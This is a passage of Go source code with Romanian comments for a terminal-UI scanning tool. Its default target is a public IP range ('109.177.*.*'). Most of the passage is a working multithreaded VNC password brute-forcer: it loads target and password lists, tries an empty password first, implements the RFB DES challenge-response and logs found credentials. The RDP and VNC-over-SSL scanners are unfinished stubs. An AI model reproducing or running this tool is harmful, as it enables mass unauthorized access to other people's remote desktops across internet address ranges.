func sciFiWizard() (rangeStr string, threads int, timeout int, vncGoroutines int, ok bool) {
	m := newWizardModel()
	p := tea.NewProgram(m)
	finalModel, _ := p.Run()
	wm := finalModel.(wizardModel)
	if !wm.finished {
		return "", 0, 0, 0, false
	}
	// Fallback la default dacă inputul e gol
	getOrDefault := func(i int, def string) string {
		if wm.values[i] == "" {
			return def
		}
		return wm.values[i]
	}
	rangeStr = getOrDefault(0, "109.177.*.*")
	threads, _ = strconv.Atoi(getOrDefault(1, "50"))
	timeout, _ = strconv.Atoi(getOrDefault(2, "5"))
	vncGoroutines, _ = strconv.Atoi(getOrDefault(3, "10"))
	return rangeStr, threads, timeout, vncGoroutines, true
}

// deepVNCScan și deepVNCScanSSL sunt funcții noi care fac handshake complet, citesc security types, hostname, etc.
// Poți implementa deepVNCScan ca scanVNCHandshakeFull dar cu parametru pentru versiunea RFB și citire hostname dacă protocolul permite.

func deepVNCScan(ip string, port int, version string) (banner string, flags string, hostname string, ssl bool) {
	// Implement handshake complet pentru VNC
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", ip, port), 10*time.Second)
	if err != nil {
		return "", "", "", false
	}
	defer conn.Close()

	// Trimite versiunea RFB
	conn.Write([]byte(version))

	// Citește security types
	secTypeCount := make([]byte, 1)
	conn.Read(secTypeCount)
	count := int(secTypeCount[0])

	// Procesează security types
	if version >= "RFB 005.000" {
		secTypes := make([]byte, count*2)
		conn.Read(secTypes)
		for i := 0; i < len(secTypes); i += 2 {
			t := binary.BigEndian.Uint16(secTypes[i : i+2])
			switch t {
			case 2:
				flags += " [VNC AUTH]"
			case 19:
				flags += " [VeNCrypt]"
			}
		}
	} else {
		secTypes := make([]byte, count)
		conn.Read(secTypes)
		for _, t := range secTypes {
			switch t {
			case 2:
				flags += " [VNC AUTH]"
			case 19:
				flags += " [VeNCrypt]"
			}
		}
	}

	// Citește hostname dacă există
	header := make([]byte, 24)
	conn.Read(header)
	nameLen := binary.BigEndian.Uint32(header[20:24])
	if nameLen > 0 {
		name := make([]byte, nameLen)
		conn.Read(name)
		hostname = string(name)
	}

	return version, flags, hostname, false
}

func deepVNCScanSSL(ip string, port int, version string) (banner string, flags string, hostname string, ssl bool) {
	// TODO: Implement SSL handshake complet, security types, hostname extraction
	return "N/A", "N/A", "N/A", true
}

func deepRDPScan(ip string, port int) string {
	// TODO: Implement handshake RDP, detect NLA, banner, version and return a status string
	return "N/A"
}

// Adaug tipul rezultat pentru brute-force VNC

type VNCBruteResult int

const (
	VNC_OK VNCBruteResult = iota
	VNC_WRONG_PASS
	VNC_TIMEOUT
	VNC_CONN_ERR
	VNC_PROTO_ERR
)

// Extind structura vncBruteStatus pentru a include noile statistici

type vncBruteStatus struct {
	CurrentIP   string
	CurrentPort int
	CurrentPass string
	Tried       int
	Total       int
	Found       int
	Fails       int // parole greșite
	Threads     int
	Rate        float64
	ETA         int
	Done        bool
	Goroutines  int32
	Timeouts    int
	ConnErrs    int
	ProtoErrs   int
	NetErrs     int // erori de rețea (no route to host, network unreachable)
}

type vncBruteModel struct {
	status   vncBruteStatus
	quitting bool
	done     bool
	statusCh <-chan vncBruteStatus
}

func (m vncBruteModel) Init() tea.Cmd {
	return m.waitStatus()
}
func (m vncBruteModel) waitStatus() tea.Cmd {
	return func() tea.Msg {
		return <-m.statusCh
	}
}
func (m vncBruteModel) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
	switch msg := msg.(type) {
	case vncBruteStatus:
		m.status = msg
		if msg.Done {
			m.done = true
			return m, tea.Quit
		}
		return m, m.waitStatus()
	case tea.KeyMsg:
		if msg.String() == "q" || msg.String() == "ctrl+c" {
			m.quitting = true
			return m, tea.Quit
		}
	}
	return m, nil
}
func (m vncBruteModel) View() string {
	panel := lipgloss.NewStyle().
		Border(lipgloss.DoubleBorder()).
		BorderForeground(lipgloss.Color("#00ffea")).
		Padding(1, 2).
		Width(60).
		Render(fmt.Sprintf(
			"VNC Brute-force\nThreads: %d\nActive goroutines: %d\nTried: %d/%d\nFound: %d\nWrong pass: %d\nTimeouts: %d\nConnErrs: %d\nNetErrs: %d\nProtoErrs: %d\nRate: %.2f tries/s\nETA: %ds\nCurrent: %s:%d | %s",
			m.status.Threads, m.status.Goroutines, m.status.Tried, m.status.Total, m.status.Found, m.status.Fails, m.status.Timeouts, m.status.ConnErrs, m.status.NetErrs, m.status.ProtoErrs, m.status.Rate, m.status.ETA, m.status.CurrentIP, m.status.CurrentPort, m.status.CurrentPass,
		))
	if m.done {
		return panel + "\n[COMPLETE] Press q or Ctrl+C to exit."
	}
	return panel + "\nPress q or Ctrl+C to stop."
}

func vncBruteMenu() {
	ipsFile := promptCyberpunk("IP list file (ex: output/ips.txt)", "output/ips.txt")
	passFile := "input/passwords.txt"
	threadsStr := promptCyberpunk("Threads", "10")
	threads, _ := strconv.Atoi(threadsStr)
	timeoutStr := promptCyberpunk("Timeout (sec)", "10")
	timeoutVal, err := strconv.Atoi(timeoutStr)
	if err != nil || timeoutVal < 1 {
		timeoutVal = 10
	}
	timeout := time.Duration(timeoutVal) * time.Second
	batchStr := promptCyberpunk("Batch size (max IP-uri simultan)", "10")
	batchSize, err := strconv.Atoi(batchStr)
	if err != nil || batchSize < 1 {
		batchSize = 10
	}

	ips := readIPs(ipsFile)
	passwords := readPasswords(passFile)
	fmt.Printf("Loaded %d targets from %s\n", len(ips), ipsFile)
	fmt.Printf("Loaded %d passwords from %s\n", len(passwords), passFile)

	if len(passwords) == 0 || passwords[0] != "" {
		passwords = append([]string{""}, passwords...)
	}

	totalJobs := len(ips) * len(passwords)
	jobs := make(chan vncBruteJob, batchSize*threads)
	results := make(chan string, 10)
	statusCh := make(chan vncBruteStatus, 10)

	model := vncBruteModel{statusCh: statusCh}

	var wg sync.WaitGroup
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			vncBruteWorker(jobs, results, timeout, statusCh, threads, totalJobs)
		}()
	}

	go func() {
		for _, ipBatch := range batchIPs(ips, batchSize) {
			for _, ipP := range ipBatch {
				for _, pass := range passwords {
					jobs <- vncBruteJob{IP: ipP.IP, Port: ipP.Port, Pass: pass}
				}
			}
		}
		close(jobs)
	}()

	go func() {
		wg.Wait()
		close(statusCh)
	}()

	tea.NewProgram(model).Run()
}

func batchIPs(ips []ipPort, batchSize int) [][]ipPort {
	var batches [][]ipPort
	for batchSize < len(ips) {
		ips, batches = ips[batchSize:], append(batches, ips[0:batchSize:batchSize])
	}
	batches = append(batches, ips)
	return batches
}

func readIPs(filename string) []ipPort {
	file, err := os.Open(filename)
	if err != nil {
		return nil
	}
	defer file.Close()
	var ips []ipPort
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		if line == "" {
			continue
		}
		line = strings.Fields(line)[0] // ia doar ip:port
		parts := strings.Split(line, ":")
		if len(parts) == 2 {
			port, err := strconv.Atoi(parts[1])
			if err == nil {
				ips = append(ips, ipPort{IP: parts[0], Port: port})
			}
		} else {
			ips = append(ips, ipPort{IP: line, Port: 5900})
		}
	}
	return ips
}

type vncBruteJob struct {
	IP   string
	Port int
	Pass string
}

func vncBruteWorker(jobs <-chan vncBruteJob, results chan<- string, timeout time.Duration, statusCh chan<- vncBruteStatus, threads int, total int) {
	tried := 0
	found := 0
	wrongPass := 0
	timeouts := 0
	connErrs := 0
	protoErrs := 0
	netErrs := 0
	start := time.Now()
	atomic.AddInt32(&activeGoroutines, 1)
	defer atomic.AddInt32(&activeGoroutines, -1)
	logf, _ := os.OpenFile("output/wrong-pass.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	defer logf.Close()
	for job := range jobs {
		tried++
		var logDetails string
		res, logDetails, netErr := tryVNCLoginWithLogNet(job.IP, job.Port, job.Pass, timeout)
		switch res {
		case VNC_OK:
			results <- fmt.Sprintf("FOUND %s:%d %s", job.IP, job.Port, job.Pass)
			found++
		case VNC_WRONG_PASS:
			wrongPass++
			if logDetails != "" {
				logf.WriteString(logDetails)
			}
		case VNC_TIMEOUT:
			timeouts++
		case VNC_CONN_ERR:
			if netErr {
				netErrs++
			} else {
				connErrs++
			}
		case VNC_PROTO_ERR:
			protoErrs++
		}
		elapsed := time.Since(start).Seconds()
		rate := float64(tried) / elapsed
		eta := int(float64(total-tried) / rate)
		status := vncBruteStatus{
			CurrentIP:   job.IP,
			CurrentPort: job.Port,
			CurrentPass: job.Pass,
			Tried:       tried,
			Total:       total,
			Found:       found,
			Fails:       wrongPass,
			Threads:     threads,
			Rate:        rate,
			ETA:         eta,
			Goroutines:  atomic.LoadInt32(&activeGoroutines),
			Done:        false,
			Timeouts:    timeouts,
			ConnErrs:    connErrs,
			ProtoErrs:   protoErrs,
			NetErrs:     netErrs,
		}
		statusCh <- status
	}
	statusCh <- vncBruteStatus{Done: true}
}

func tryVNCLoginWithLogNet(ip string, port int, password string, timeout time.Duration) (VNCBruteResult, string, bool) {
	versions := []string{"RFB 003.003\n", "RFB 003.007\n", "RFB 003.008\n", "RFB 005.000\n"}
	for _, version := range versions {
		res, logDetails, netErr := tryVNCLoginWithVersionLogNet(ip, port, password, timeout, version, false)
		if res != VNC_PROTO_ERR {
			return res, logDetails, netErr
		}
	}
	for _, version := range versions {
		res, logDetails, netErr := tryVNCLoginWithVersionLogNet(ip, port, password, timeout, version, true)
		if res != VNC_PROTO_ERR {
			return res, logDetails, netErr
		}
	}
	return VNC_PROTO_ERR, "", false
}

// tryVNCLoginWithVersionLogNet: ca tryVNCLoginWithVersionLog, dar detectează network error
func tryVNCLoginWithVersionLogNet(ip string, port int, password string, timeout time.Duration, version string, useSSL bool) (VNCBruteResult, string, bool) {
	var conn net.Conn
	var err error
	address := fmt.Sprintf("%s:%d", ip, port)
	if useSSL {
		conf := &tls.Config{InsecureSkipVerify: true}
		conn, err = tls.DialWithDialer(&net.Dialer{Timeout: timeout}, "tcp", address, conf)
	} else {
		conn, err = net.DialTimeout("tcp", address, timeout)
	}
	if err != nil {
		if os.IsTimeout(err) {
			return VNC_TIMEOUT, "", false
		}
		if strings.Contains(err.Error(), "no route to host") || strings.Contains(err.Error(), "network is unreachable") {
			return VNC_CONN_ERR, "", true
		}
		return VNC_CONN_ERR, "", false
	}
	defer conn.Close()

	perStep := timeout / 2
	if perStep < time.Second {
		perStep = time.Second
	}

	banner := make([]byte, 12)
	conn.SetReadDeadline(time.Now().Add(perStep))
	_, err = conn.Read(banner)
	if err != nil || !strings.HasPrefix(string(banner), "RFB") {
		return VNC_PROTO_ERR, "", false
	}
	conn.SetWriteDeadline(time.Now().Add(perStep))
	conn.Write([]byte(version))
	secType := make([]byte, 1)
	conn.SetReadDeadline(time.Now().Add(perStep))
	_, err = conn.Read(secType)
	if err != nil || secType[0] != 2 {
		return VNC_PROTO_ERR, "", false
	}
	conn.SetWriteDeadline(time.Now().Add(perStep))
	conn.Write([]byte{2})
	challenge := make([]byte, 16)
	conn.SetReadDeadline(time.Now().Add(perStep))
	_, err = conn.Read(challenge)
	if err != nil {
		return VNC_PROTO_ERR, "", false
	}
	response := vncEncryptChallenge(password, challenge)
	conn.SetWriteDeadline(time.Now().Add(perStep))
	conn.Write(response)
	result := make([]byte, 4)
	conn.SetReadDeadline(time.Now().Add(perStep))
	_, err = conn.Read(result)
	if err != nil {
		return VNC_PROTO_ERR, "", false
	}
	if binary.BigEndian.Uint32(result) == 0 {
		return VNC_OK, "", false
	}
	logDetails := fmt.Sprintf("WRONG_PASS %s:%d pass='%s' version='%s' ssl=%v\n", ip, port, password, strings.TrimSpace(version), useSSL)
	return VNC_WRONG_PASS, logDetails, false
}

func vncEncryptChallenge(password string, challenge []byte) []byte {
	key := make([]byte, 8)
	copy(key, []byte(password))
	for i := range key {
		key[i] = reverseBits(key[i])
	}
	block, _ := des.NewCipher(key)
	response := make([]byte, 16)
	block.Encrypt(response[:8], challenge[:8])
	block.Encrypt(response[8:], challenge[8:])
	return response
}

func reverseBits(b byte) byte {
	b = (b&0xF0)>>4 | (b&0x0F)<<4
	b = (b&0xCC)>>2 | (b&0x33)<<2
	b = (b&0xAA)>>1 | (b&0x55)<<1
	return b
}

func readPasswords(filename string) []string {
	file, err := os.Open(filename)
	if err != nil {
		return nil
	}
	defer file.Close()
	var passwords []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		passwords = append(passwords, scanner.Text())
	}
	return passwords
}
